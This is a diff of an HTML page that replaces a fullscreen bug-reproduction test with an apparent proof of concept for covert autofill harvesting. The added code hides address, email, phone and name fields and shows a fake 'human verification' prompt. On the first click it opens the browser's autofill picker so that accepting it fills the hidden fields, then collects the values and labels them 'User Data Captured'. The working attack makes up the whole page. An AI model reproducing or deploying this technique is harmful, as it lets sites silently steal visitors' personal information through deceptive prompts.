@@ -1,112 +1,87 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Fullscreen Omnibox Repro (select tap)</title>
-
 <style>
-html, body {
-  margin: 0;
-  padding: 0;
-  height: 100%;
-  font-family: sans-serif;
-}
+    input {
+        opacity: 0;
+        width: 0.1px;
+        border: none;
+        pointer-events: none;
+    }
 
-body {
-  background: #f2f2f2;
-}
+    option {
+        all: initial;
+        background-color: black;
+    }
 
-.wrap {
-  padding: 24px;
-}
+    select {
+        opacity: 0;
+        pointer-events: none;
+        position: absolute;
+        top: -10px;
+        left:225px;
+    }
 
-select {
-  font-size: 18px;
-  padding: 10px;
-}
-
-#log {
-  margin-top: 20px;
-  white-space: pre-wrap;
-  font-size: 14px;
-}
-
-#fsLayer {
-  position: fixed;
-  inset: 0;
-  background: #000;
-  color: #fff;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 28px;
-  z-index: 999999;
-}
 </style>
-</head>
 
 <body>
-<div class="wrap">
+    <!-- Group 1 -->
+    <div class="input-group">
+        <div>
+            <span id="quest"></span><input id="autofill-data" name="name" autocomplete="name">
+        </div>
 
-  <!-- Tap this on mobile -->
-  <select id="tap">
-    <option selected>Tap Here</option>
-    <option>Run</option>
-  </select>
+        <input name="email" autocomplete="email">
+        <input name="address-line1" autocomplete="address-line1">
+        <input name="address-line2" autocomplete="address-line2">
+        <input name="city" autocomplete="address-level2">
+        <input name="state" autocomplete="address-level1">
+        <input name="country-name" autocomplete="country-name">
+        <input name="postal-code" autocomplete="postal-code">
+        <input name="tel" autocomplete="tel">
+    </div>
 
-  <div id="log">Tap the select menu.</div>
-</div>
+    <select id="selection">
+        <option>&emsp;&emsp;&emsp;&#128030;&emsp;&emsp;&emsp;</option>
+        <option>&emsp;&emsp;&emsp;&#128031;&emsp;&emsp;&emsp;</option>
+        <option>&emsp;&emsp;&emsp;&#128036;&emsp;&emsp;&emsp;</option>
+        <option>&emsp;&emsp;&emsp;&#128011;&emsp;&emsp;&emsp;</option>
+    </select>
+    <center>
+        <pre id="autofill-result"
+            style="background-color: aquamarine;font-size: 1.5rem;">The site requires human verification to proceed. Click to begin.</pre>
+    </center>
 
-<script>
-const sel = document.getElementById("tap");
-const log = document.getElementById("log");
 
-function write(msg) {
-  log.textContent += "\n" + msg;
-}
+    <script>
+        const inputfill = document.getElementById('autofill-data');
+        const selectpicker = document.getElementById('selection');
+        function handleClick() {
+            document.getElementById('autofill-result').textContent = "Double-click the bug to verify";
+            document.getElementById('quest').textContent = "Double-click the bug to verify";
+            selectpicker.showPicker();
+            setTimeout(() => {
+                inputfill.showPicker();
+            }, 100);
+            document.removeEventListener('click', handleClick);
+        }
 
-async function run() {
-  try {
-    const fs = document.createElement("div");
-    fs.id = "fsLayer";
-    fs.textContent = "Fullscreen Active";
-    document.body.appendChild(fs);
+        document.addEventListener('click', handleClick);
 
-    write("requestFullscreen()");
-    await fs.requestFullscreen();
 
-    // canvas.toBlob used for async timing window
-    const canvas = document.createElement("canvas");
-    canvas.width = 32;
-    canvas.height = 32;
+        var inputFields = document.querySelectorAll('.input-group input');
 
-    const ctx = canvas.getContext("2d");
-    ctx.fillStyle = "red";
-    ctx.fillRect(0, 0, 32, 32);
+        inputFields.forEach(function (inputField) {
+            inputField.addEventListener('input', function () {
 
-    canvas.toBlob(async () => {
-      write("exitFullscreen()");
-      await document.exitFullscreen();
+                var formData = {};
 
-      // append fullscreen element into <html>
-      document.documentElement.appendChild(fs);
 
-      write("Moved fullscreen node into <html> after exit.");
-      write("If bug reproduces, mobile omnibox stays hidden.");
-    });
+                inputFields.forEach(function (field) {
+                    formData[field.name] = field.value;
+                });
 
-  } catch (err) {
-    write("Error: " + err.message);
-  }
-}
 
-/*
- Use change because tapping a select option is a trusted user gesture
-*/
-sel.addEventListener("change", () => {
-  if (sel.value === "Run") run();
-});
-</script>
+                document.getElementById('autofill-result').textContent = JSON.stringify(formData, null, 2);
+                document.getElementById('quest').textContent = "User Data Captured";
+            });
+        });
+    </script>
 </body>
-</html>
